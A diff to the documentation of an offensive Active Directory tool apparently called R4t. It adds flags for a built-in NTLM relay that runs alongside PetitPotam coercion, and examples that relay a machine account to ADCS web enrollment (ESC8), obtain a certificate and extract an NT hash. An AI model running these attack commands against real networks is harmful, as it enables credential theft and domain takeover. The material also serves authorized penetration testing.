@@ -30,6 +30,39 @@ These flags are shared across all coercion methods:
 
 ---
 
+## Relay Flags
+
+When `--relay <host>` is set, R4t starts a built-in relay server alongside the coercion attack and forwards captured authentication to the specified target. These flags are available on every method subcommand.
+
+| Flag | Description |
+|------|-------------|
+| `--relay <host>` | Relay target host — enables the built-in relay server |
+| `--adcs` | Relay type: SMB→HTTP(S) to Certificate Authority (ESC8) *(default when no type is set)* |
+| `--smb` | Relay type: SMB→SMB *(not yet implemented)* |
+| `--ldap` | Relay type: SMB→LDAP *(not yet implemented)* |
+| `--ldaps` | Relay type: SMB→LDAPS *(not yet implemented)* |
+| `--shadow-credentials` | Relay type: Shadow Credentials via LDAP *(not yet implemented)* |
+| `--mssql` | Relay type: SMB→MSSQL *(not yet implemented)* |
+
+### ADCS Relay Options
+
+These flags apply when using `--adcs` (or when no relay type is specified, since ADCS is the default).
+
+| Flag | Description |
+|------|-------------|
+| `--template <name>` | Certificate template to request **(required for ADCS relay)** |
+| `--https` | Use HTTPS when relaying to the CA (default: HTTP port 80) |
+| `--relay-port <port>` | Override the port on the relay target (0 = protocol default) |
+| `--ca-name <name>` | CA name — kept for CLI compatibility; ignored for certsrv web relay |
+
+### Shadow Credentials Relay Options
+
+| Flag | Description |
+|------|-------------|
+| `--shadow-target <account>` | Account to inject shadow credentials into |
+
+---
+
 ## Subcommands
 
 ### `coerce petitpotam`
@@ -162,12 +195,18 @@ r4t coerce petitpotam --listener 10.10.10.100 server01.corp.example.com
 
 ### Relay to ADCS Web Enrollment (ESC8)
 
-```bash
-# Start ntlmrelayx targeting ADCS web enrollment (external)
-ntlmrelayx.py -t http://ca.corp.example.com/certsrv/certfnsh.asp --adcs --template Machine
+R4t has a built-in relay for ADCS — no external `ntlmrelayx` needed. `--template` is required.
 
-# Coerce a machine account
-r4t coerce petitpotam --listener 10.10.10.100 server01.corp.example.com
+```bash
+# Coerce and relay in one command — relay server starts automatically
+r4t coerce petitpotam --listener 10.10.10.100 \
+  --relay ca.corp.example.com --adcs --template Machine \
+  server01.corp.example.com
+
+# Use HTTPS if the CA only serves over 443
+r4t coerce petitpotam --listener 10.10.10.100 \
+  --relay ca.corp.example.com --adcs --template Machine --https \
+  server01.corp.example.com
 
 # Use resulting PFX to extract NT hash
 r4t adcs nt --pfx /tmp/server01.pfx
